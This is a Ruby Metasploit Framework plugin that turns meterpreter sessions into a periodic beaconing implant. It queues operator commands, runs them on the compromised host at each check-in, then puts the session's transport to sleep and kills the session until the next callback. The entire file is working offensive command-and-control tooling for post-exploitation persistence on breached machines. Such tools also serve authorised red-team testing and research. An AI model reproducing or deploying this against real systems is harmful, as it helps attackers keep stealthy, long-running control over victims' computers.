module Msf
class Plugin::Beacon < Msf::Plugin

  def name
    'beacon'
  end

  def desc
    "Makes meterpreter a ghetto beaconing implant"
  end

  def initialize(framework, opts)
    super
    @inst = add_console_dispatcher(BeaconCommandDispatcher)
  end

  def cleanup
    remove_console_dispatcher('beacon')
    self.framework.events.remove_session_subscriber(@inst)
  end

  class BeaconCommandDispatcher
    include Msf::SessionEvent
    include Msf::Ui::Console::CommandDispatcher

    def initialize(console_driver)
      super
      @beacons = {}
      self.framework.events.add_session_subscriber(self)
    end

    def commands
      {
        'beacon_start' => "Start Beaconing - beacon_start [UUID|SESSION] PERIOD",
        'beacon_stop' => "Stop Beaconing - beacon_stop UUID",
        'beacon_commands' => "Run commands on next checkin - beacon_cmd UUID *CMDs",
        'beacon_status' => "Get beacon status"
      }
    end

    def on_session_open(session)
      return unless session.type == 'meterpreter'
      uuid = Rex::Text.to_hex(session.core.uuid.puid, "")
      beacon_info = @beacons[uuid]
      period = beacon_info[:period]
      if period
        @beacons[uuid][:last_checkin] = DateTime.now
        Thread.new do
          # We run in a new thread to let the other session handlers
          # have a chance to initialize the UI and load stdapi etc.
          #session.init_ui(self.driver.input, self.driver.output)
          Rex.sleep 10
          cmds = beacon_info[:commands]
          if cmds
            print_status "Running #{cmds.length} commands on #{uuid}"
            cmds.each do |cmd|
              begin
                print_status("Running '#{cmd}' on #{uuid}")
                session.run_cmd cmd
              rescue Exception => e
                print_error("Error running #{cmd} - #{e}")
              end
            end
            beacon_info[:commands] = nil
          end

          @beacons[uuid][:last_checkin] = DateTime.now
          @beacons[uuid][:next_checkin] = (DateTime.now + period.seconds)
          print_status "Sleeping #{uuid} #{period}s"
          session.core.transport_sleep period
          sleep 5
          session.shutdown_passive_dispatcher
          sleep 5
          session.kill
        end
      end
    end

    def arg_to_uuid(arg)
      if arg =~ /\A[-+]?[0-9]+\z/
        session = framework.sessions[arg.to_i]
        if session
          uuid = Rex::Text.to_hex(framework.sessions[arg.to_i].core.uuid.puid, "")
        else
          print_error "Session #{arg} does not exist"
          uuid = nil
        end
      else
        uuid = arg
      end

      uuid
    end

    def cmd_beacon_start(*args)
      if args.length == 2
        # TODO Check args
        uuid = arg_to_uuid(args.shift)
        return unless uuid

        period = args.shift.to_i
        if period < 30
          print_error("Minimum sleep time 30s")
          return
        end

        print_status "Beaconing #{uuid} every #{period}s"
        @beacons[uuid] = { period: period, commands: nil, last_checkin: "Unknown", next_checkin: "Unknown" }
        framework.sessions.each do |s|
          if Rex::Text.to_hex(s.last.core.uuid.puid, "") == uuid
            @beacons[uuid][:last_checkin] = DateTime.now
            @beacons[uuid][:next_checkin] = (DateTime.now + period.seconds)
            s.last.core.transport_sleep period
            sleep 5
            s.last.shutdown_passive_dispatcher
            sleep 5
            s.last.kill
          end
        end
      else
        print_error("Usage: beacon_start UUID PERIOD")
      end
    end

    def cmd_beacon_stop(*args)
      if args.length == 1
        uuid = args.shift
        print_status("Stopping #{uuid} beaconing")
        if @beacons[uuid]
          @beacons[uuid][:period] = nil
        end
      else
        print_error("Usage: beacon_stop UUID")
      end
    end

    def cmd_beacon_commands(*args)
      if args.length > 1
        uuid = args.shift
        if @beacons[uuid]
          if @beacons[uuid][:commands]
            @beacons[uuid][:commands] << args
            @beacons[uuid][:commands].flatten!
          else
            @beacons[uuid][:commands] = args
          end
          print_status "Queueing #{args.length} commands on #{uuid}"
        else
          print_error "Non-beaconing uuid: #{uuid}"
        end
      else
        print_error("Usage: beacon_commands UUID *CMDS")
      end
    end

    def cmd_beacon_status
      print_status "Current beacons:"
      @beacons.each do |k,v|
        print_line "Beacon #{k} - last checkin #{v[:last_checkin]} - next checkin #{v[:next_checkin]}"
      end
    end

    def name
      'beacon'
    end
  end
end
end
